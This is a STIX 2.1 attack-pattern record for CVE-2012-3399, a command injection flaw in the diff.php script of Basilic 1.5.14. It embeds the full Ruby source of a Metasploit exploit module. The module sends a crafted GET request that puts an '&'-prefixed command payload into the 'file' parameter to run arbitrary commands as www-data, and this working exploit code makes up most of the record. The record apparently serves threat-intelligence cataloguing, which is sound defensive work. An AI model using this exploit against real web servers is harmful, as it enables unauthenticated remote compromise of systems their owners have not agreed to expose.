{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08e266c9-8b34-408e-b5fd-fb5c47223ef2",
    "created": "2024-08-14T17:13:12.540263Z",
    "modified": "2024-08-14T17:13:12.540267Z",
    "name": "Basilic 1.5.14 diff.php Arbitrary Command Execution",
    "description": " This module abuses a metacharacter injection vulnerability in the diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary commands as the www-data user account. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/basilic_diff_exec.rb",
            "external_id": "basilic_diff_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3399"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Basilic 1.5.14 diff.php Arbitrary Command Execution',\n      'Description'    => %q{\n          This module abuses a metacharacter injection vulnerability in the\n        diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary\n        commands as the www-data user account.\n      },\n      'Author'         =>\n        [\n          'lcashdollar',\n          'sinn3r',\n          'juan vazquez'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-3399' ],\n          [ 'OSVDB', '83719' ],\n          [ 'BID', '54234' ]\n        ],\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python telnet'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-06-28'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to Basilic', '/basilic-1.5.14/'])\n      ])\n  end\n\n\n  def check\n    base = normalize_uri(target_uri.path)\n\n    sig = rand_text_alpha(10)\n\n    res = send_request_cgi({\n      'uri'  => normalize_uri(\"/#{base}/Config/diff.php\"),\n      'vars_get' => {\n        'file' => sig,\n        'new'  => '1',\n        'old'  => '2'\n      }\n    })\n\n    if res and res.code == 200 and res.body =~ /#{sig}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    print_status(\"Sending GET request...\")\n\n    base = normalize_uri(target_uri.path)\n\n    res = send_request_cgi({\n        'uri' => normalize_uri(\"/#{base}/Config/diff.php\"),\n        'vars_get' => {\n          'file' => \"&#{payload.encoded} #\",\n          'new'  => '1',\n          'old'  => '2'\n        }\n      })\n\n    if res and res.code == 404 then\n      print_error(\"404 Basilic not installed or possibly check URI Path.\")\n    else\n      vprint_line(\"Server returned #{res.code}\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-28",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}